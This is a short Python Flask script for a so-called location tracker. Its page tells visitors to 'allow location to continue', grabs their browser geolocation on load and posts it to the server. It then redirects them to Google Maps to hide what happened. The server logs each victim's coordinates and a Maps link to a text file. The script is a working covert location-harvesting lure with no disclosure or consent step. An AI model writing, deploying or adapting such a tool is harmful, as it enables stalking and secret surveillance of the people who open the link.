from flask import Flask, request, redirect, render_template_string
import os

app = Flask(__name__)

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Location Tracker</title>
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendPosition);
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }

        function sendPosition(position) {
            fetch("/location", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude
                }),
            }).then(() => {
                window.location.href = "https://www.google.com/maps";
            });
        }
    </script>
</head>
<body onload="getLocation()">
    <h1>Allow location to continue...</h1>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_PAGE)

@app.route("/location", methods=["POST"])
def location():
    data = request.get_json()
    lat = data.get("latitude")
    lon = data.get("longitude")
    gmap_link = f"https://maps.google.com/?q={lat},{lon}"

    with open("location.txt", "a") as file:
        file.write(f"Latitude: {lat}, Longitude: {lon}\nGoogle Maps: {gmap_link}\n\n")

    os.system("clear")
    os.system("figlet Location Tracker | lolcat")
    print("New location received and saved to location.txt\n".upper())

    return "", 204

if __name__ == "__main__":
    os.system("clear")
    os.system("figlet Starting... | lolcat")
    app.run(host="0.0.0.0", port=5000)
